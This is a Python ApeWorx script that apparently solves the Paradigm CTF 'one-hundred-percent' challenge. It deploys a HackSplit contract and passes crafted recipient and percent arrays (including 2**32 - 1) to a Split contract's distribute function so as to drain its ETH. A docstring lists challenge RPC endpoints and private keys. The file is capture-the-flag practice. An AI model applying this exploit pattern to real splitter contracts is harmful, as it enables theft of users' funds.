#!/usr/bin/python3
from ape import accounts, convert, networks, project

"""
------
remote:
------
rpc endpoints:
    - http://one-hundred-percent.challenges.paradigm.xyz:8545/51470e0c-dfa5-432a-a7c9-bbd5ef6384ba/main
private key:        0x0fb15edde36480796a1990b29dbac13f73ae17fe57be2e024ace9b1300513c8f
challenge contract: 0xF34cff576e8Ce72a6b7d3202f1f4F2543aEFC2F5

-----
local:
-----
rpc endpoints:
    - http://127.0.0.1:8545/4fbcc49c-de55-4bdf-ac7f-b821fecc15c6/main
private key:        0xd2ad824ed1ab537c1e21d22b3a00635a86e539142bb302af442684a88f7a8bd7
challenge contract: 0xA85aEbc4d8d1D1180Bb90a432dB37685745485e5
"""

"""
0x000000000000000000000000000000000000dEaD + 0x000000000000000000000000000000000000bEEF + 5000 + 5000 + 0
"""
ETH = "0x0000000000000000000000000000000000000000"


def attack():
    # attacker = accounts.load("100_percent")
    # attacker.set_autosign(True, passphrase="a")
    attacker = accounts.test_accounts[1]

    challenge = project.Challenge.at("0x72F375F23BCDA00078Ac12e7e9E7f6a8CA523e7D")
    split = project.Split.at(challenge.SPLIT())

    # attacker.transfer(account=split, value="20 ether")

    # attack_contract = project.Exploit.deploy(challenge.address, split.address, sender=attacker)

    # attacker.transfer(account=attack_contract.address, value="300 ether")

    # attack_contract.hack(sender=attacker)

    addresses = [
        "0x000000000000000000000000000000000000dEaD",
        "0x000000000000000000000000000000000000bEEF",
    ]
    percents = [int(5e5), int(5e5)]  # [5 * 10**5, 5 * 10**5]  # 5e5

    split_id = split.splitsById(0)

    print(f"Split ID: {split_id}")
    print(f"Solved: {challenge.isSolved()}")

    print(f"Attacker balance: {attacker.balance // 10 ** 18}")
    print(f"Split balance: {split.balance // 10 ** 18}")

    hack_contract = project.HackSplit.deploy(split, sender=attacker)

    split.distribute(
        0,
        addresses,
        percents,
        0,
        ETH,
        sender=attacker,
    )
    # hack_contract.interactWithDistribute(
    #     0, addresses, percents, 0, ETH, sender=attacker
    # )

    # 0x0000000000000000000000000000000010000000
    attacker_address = [hack_contract.address, "0x000000000000000000000000000000000000bEEF"]
    attacker_percents = [int(1e6), 0]

    split_id = split.createSplit(
        attacker_address, attacker_percents, 0, sender=attacker
    )
    print("Split created")
    # print(f"Split ID: {split_id}")

    split_data = split.splitsById(1)
    split_data_wallet = project.SplitWallet.at(split_data.wallet)

    split_data_wallet.deposit(value="200 ether", sender=attacker)

    print("200 ETH Deposited")
    print(f"Attacker balance: {attacker.balance // 10 ** 18}")
    # print(f"Split balance: {split.balance // 10 ** 18}")
    print(f"Split Wallet balance: {split_data_wallet.balance // 10 ** 18}")

    exploit_address = [hack_contract.address]
    exploit_percents = [2**32 - 1, int(1e6), 0]

    
    hack_contract.interactWithDistribute(
        1, exploit_address, exploit_percents, 0, ETH, sender=attacker
    )

    # split.distribute(
    #     1,
    #     exploit_address,
    #     exploit_percents,
    #     0,
    #     ETH,
    #     sender=attacker,
    # )

    tokens = [ETH]
    amounts = [convert("300 ether", int)]

    # split.withdraw(tokens, amounts, sender=attacker)

    print(challenge.isSolved())


def main():
    attack()


if __name__ == "__main__":
    main()
